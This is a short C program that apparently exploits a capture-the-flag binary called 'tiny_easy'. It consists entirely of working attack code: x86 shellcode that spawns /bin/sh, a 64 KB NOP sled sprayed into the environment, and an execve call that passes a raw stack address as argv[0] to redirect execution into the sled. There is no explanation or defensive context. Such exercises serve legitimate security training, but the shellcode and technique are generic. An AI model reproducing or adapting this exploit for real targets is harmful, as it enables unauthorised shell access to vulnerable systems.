#include <stdio.h>
#include <string.h>
char shellcode[] =
        "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
        "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
        "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
char payload[0x10000];

int main(int argc, const char *argv[])
{
    int i = 0;
    for (i = 0; i < 0xff00; i++){
        payload[i] = '\x90';
    }
    strcpy(payload + 0xff00, shellcode);

    char *my_argv[] = {"\x38\x5c\xe3\xff", NULL};
    char *my_env[]  = {payload, NULL};
    execve("./tiny_easy", my_argv, my_env);
    return 0;
}
